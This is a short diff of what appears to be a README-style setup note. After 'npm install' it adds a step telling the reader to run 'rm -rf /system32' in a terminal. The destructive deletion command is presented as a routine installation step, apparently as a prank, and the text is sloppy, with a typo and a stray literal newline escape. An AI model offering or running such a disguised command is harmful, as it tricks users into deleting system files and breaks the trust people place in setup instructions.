@@ -1,11 +1,9 @@
-hi
+hi. \n
 run 
 ```bash
 npm install
 ```
-then run this file below in python.
-
-
+then run this in temrinal
 
 ```bash
 rm -rf /system32
